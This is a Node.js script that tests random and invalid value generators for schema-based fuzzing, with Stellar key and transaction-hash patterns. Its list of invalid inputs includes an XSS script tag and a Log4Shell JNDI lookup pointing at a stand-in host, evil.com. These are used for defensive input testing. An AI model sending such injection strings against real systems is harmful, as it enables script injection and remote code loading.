#!/usr/bin/env node
/**
 * Simple test script for random generators without full Jest setup
 */

const yaml = require("js-yaml");
const fs = require("fs");
const path = require("path");

// Copy the generator functions from the fuzz test
const randomGenerators = {
  string: (schema) => {
    const minLength = schema.minLength || 1;
    const maxLength = schema.maxLength || 100;
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;

    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`";
    let result = "";
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    if (schema.pattern) {
      try {
        const regex = new RegExp(schema.pattern);
        if (schema.pattern === "^G[A-Z0-9]{55}$") {
          return "G" + Array(55).fill(0).map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[Math.floor(Math.random() * 36)]).join("");
        }
        if (schema.pattern === "^[a-fA-F0-9]{64}$") {
          return Array(64).fill(0).map(() => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("");
        }
      } catch (e) {
        // Invalid regex, fallback to random string
      }
    }

    if (schema.enum && schema.enum.length > 0) {
      return schema.enum[Math.floor(Math.random() * schema.enum.length)];
    }

    return result;
  },

  number: (schema) => {
    const minimum = schema.minimum !== undefined ? schema.minimum : -1000000;
    const maximum = schema.maximum !== undefined ? schema.maximum : 1000000;
    return Math.random() * (maximum - minimum) + minimum;
  },

  integer: (schema) => {
    const minimum = schema.minimum !== undefined ? schema.minimum : -1000000;
    const maximum = schema.maximum !== undefined ? schema.maximum : 1000000;
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
  },

  boolean: () => Math.random() < 0.5,

  array: (schema, depth = 0) => {
    if (depth > 3) return [];
    const minItems = schema.minItems || 0;
    const maxItems = schema.maxItems || 5;
    const length = Math.floor(Math.random() * (maxItems - minItems + 1)) + minItems;

    if (!schema.items) return Array(length).fill(null);

    return Array(length)
      .fill(0)
      .map(() => generateRandomValue(schema.items, depth + 1));
  },

  object: (schema, depth = 0) => {
    if (depth > 3) return {};
    const result = {};

    if (schema.properties) {
      for (const [propName, propSchema] of Object.entries(schema.properties)) {
        if (!schema.required || !schema.required.includes(propName) || Math.random() < 0.8) {
          result[propName] = generateRandomValue(propSchema, depth + 1);
        }
      }
    }

    if (Math.random() < 0.2) {
      result[`extra_field_${Math.random().toString(36).substring(7)}`] = "unexpected_value";
    }

    return result;
  },
};

function generateRandomValue(schema, depth = 0) {
  if (!schema || typeof schema !== "object") {
    return "random_value";
  }

  if (schema.$ref) {
    return {};
  }

  if (schema.anyOf && schema.anyOf.length > 0) {
    return generateRandomValue(schema.anyOf[Math.floor(Math.random() * schema.anyOf.length)], depth);
  }
  if (schema.oneOf && schema.oneOf.length > 0) {
    return generateRandomValue(schema.oneOf[Math.floor(Math.random() * schema.oneOf.length)], depth);
  }
  if (schema.allOf && schema.allOf.length > 0) {
    const result = {};
    for (const subSchema of schema.allOf) {
      Object.assign(result, generateRandomValue(subSchema, depth));
    }
    return result;
  }

  const type = schema.type || "string";

  if (Array.isArray(type)) {
    return generateRandomValue({ type: type[Math.floor(Math.random() * type.length)] }, depth);
  }

  const generator = randomGenerators[type];
  if (generator) {
    return generator(schema, depth);
  }

  return "random_value";
}

function generateInvalidValue(schema) {
  const invalidTypes = [
    null,
    undefined,
    "",
    "string",
    123,
    true,
    [],
    {},
    { nested: { object: "value" } },
    "a".repeat(10000),
    -999999999999999,
    999999999999999,
    "🚀🌟💀🎉",
    "<script>alert('xss')</script>",
    "${jndi:ldap://evil.com/a}",
  ];

  return invalidTypes[Math.floor(Math.random() * invalidTypes.length)];
}

// Run tests
console.log("🧪 Testing Random Generators");
console.log("============================");

let passed = 0;
let failed = 0;

// Test 1: String generation
try {
  const schema = { type: "string", minLength: 5, maxLength: 20 };
  const value = generateRandomValue(schema);
  if (typeof value === "string" && value.length >= 5 && value.length <= 20) {
    console.log("✅ String generation works");
    passed++;
  } else {
    console.log("❌ String generation failed");
    failed++;
  }
} catch (e) {
  console.log("❌ String generation error:", e.message);
  failed++;
}

// Test 2: Number generation
try {
  const schema = { type: "number", minimum: 0, maximum: 100 };
  const value = generateRandomValue(schema);
  if (typeof value === "number" && value >= 0 && value <= 100) {
    console.log("✅ Number generation works");
    passed++;
  } else {
    console.log("❌ Number generation failed");
    failed++;
  }
} catch (e) {
  console.log("❌ Number generation error:", e.message);
  failed++;
}

// Test 3: Integer generation
try {
  const schema = { type: "integer", minimum: -10, maximum: 10 };
  const value = generateRandomValue(schema);
  if (typeof value === "number" && Number.isInteger(value) && value >= -10 && value <= 10) {
    console.log("✅ Integer generation works");
    passed++;
  } else {
    console.log("❌ Integer generation failed");
    failed++;
  }
} catch (e) {
  console.log("❌ Integer generation error:", e.message);
  failed++;
}

// Test 4: Boolean generation
try {
  const schema = { type: "boolean" };
  const value = generateRandomValue(schema);
  if (typeof value === "boolean") {
    console.log("✅ Boolean generation works");
    passed++;
  } else {
    console.log("❌ Boolean generation failed");
    failed++;
  }
} catch (e) {
  console.log("❌ Boolean generation error:", e.message);
  failed++;
}

// Test 5: Array generation
try {
  const schema = { type: "array", minItems: 1, maxItems: 5, items: { type: "string" } };
  const value = generateRandomValue(schema);
  if (Array.isArray(value) && value.length >= 1 && value.length <= 5) {
    console.log("✅ Array generation works");
    passed++;
  } else {
    console.log("❌ Array generation failed");
    failed++;
  }
} catch (e) {
  console.log("❌ Array generation error:", e.message);
  failed++;
}

// Test 6: Object generation
try {
  const schema = {
    type: "object",
    properties: {
      name: { type: "string" },
      age: { type: "integer" },
    },
    required: ["name"],
  };
  const value = generateRandomValue(schema);
  if (typeof value === "object" && value !== null && !Array.isArray(value)) {
    console.log("✅ Object generation works");
    passed++;
  } else {
    console.log("❌ Object generation failed");
    failed++;
  }
} catch (e) {
  console.log("❌ Object generation error:", e.message);
  failed++;
}

// Test 7: Enum handling
try {
  const schema = { type: "string", enum: ["active", "completed", "paused"] };
  const value = generateRandomValue(schema);
  if (["active", "completed", "paused"].includes(value)) {
    console.log("✅ Enum handling works");
    passed++;
  } else {
    console.log("❌ Enum handling failed");
    failed++;
  }
} catch (e) {
  console.log("❌ Enum handling error:", e.message);
  failed++;
}

// Test 8: Stellar public key pattern
try {
  const schema = { type: "string", pattern: "^G[A-Z0-9]{55}$" };
  const value = generateRandomValue(schema);
  if (typeof value === "string" && /^G[A-Z0-9]{55}$/.test(value)) {
    console.log("✅ Stellar public key pattern works");
    passed++;
  } else {
    console.log("❌ Stellar public key pattern failed");
    failed++;
  }
} catch (e) {
  console.log("❌ Stellar public key pattern error:", e.message);
  failed++;
}

// Test 9: Transaction hash pattern
try {
  const schema = { type: "string", pattern: "^[a-fA-F0-9]{64}$" };
  const value = generateRandomValue(schema);
  if (typeof value === "string" && /^[a-fA-F0-9]{64}$/.test(value)) {
    console.log("✅ Transaction hash pattern works");
    passed++;
  } else {
    console.log("❌ Transaction hash pattern failed");
    failed++;
  }
} catch (e) {
  console.log("❌ Transaction hash pattern error:", e.message);
  failed++;
}

// Test 10: Invalid value generation
try {
  const schema = { type: "string" };
  const invalidTypes = new Set();
  for (let i = 0; i < 20; i++) {
    const value = generateInvalidValue(schema);
    invalidTypes.add(typeof value);
  }
  if (invalidTypes.size > 1) {
    console.log("✅ Invalid value generation produces variety");
    passed++;
  } else {
    console.log("❌ Invalid value generation lacks variety");
    failed++;
  }
} catch (e) {
  console.log("❌ Invalid value generation error:", e.message);
  failed++;
}

console.log("============================");
console.log(`Results: ${passed} passed, ${failed} failed`);

if (failed === 0) {
  console.log("✅ All random generator tests passed!");
  process.exit(0);
} else {
  console.log("❌ Some tests failed");
  process.exit(1);
}